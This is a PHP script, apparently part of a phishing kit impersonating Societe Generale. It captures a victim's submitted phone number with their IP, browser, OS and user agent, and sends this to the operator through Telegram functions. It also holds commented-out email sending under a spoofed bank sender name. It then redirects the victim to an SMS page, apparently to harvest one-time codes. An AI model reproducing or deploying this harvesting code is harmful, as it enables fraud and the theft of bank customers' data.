<?php


/*

Author : DIB
Email : bassouwinwinm@gmail.com
ICQ : 

*/
if(isset($_POST['tel'])){
	
include "../config.php";
include "funcs.php";

$tel =  $_POST['tel'];

$message = "\n📋 Telephone: $tel\n🕹️OS : ".getOs($_SERVER['HTTP_USER_AGENT'])."\n🕹️Browser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\n🕹️IP : $ip\n🕹️Agent: ".$_SERVER['HTTP_USER_AGENT']."\n----\n";

toTG($message);
$headers = "From:  Societe Generale  <noreply@pabloescobard.com>";
//$headers .= "Content-type: text/html; charset=UTF-8\n";
$subject = "🔔 N° Tel |  $ip";

$emaillist = explode(',',$to);

// foreach($emaillist as $email){
// mail($email,$subject,$message,$headers,$head);
// }
send_telegram_msg($subject."\n".$message);
echo "<meta http-equiv=\"Refresh\" content=\"0; url=../sms.php\" />";



}
?>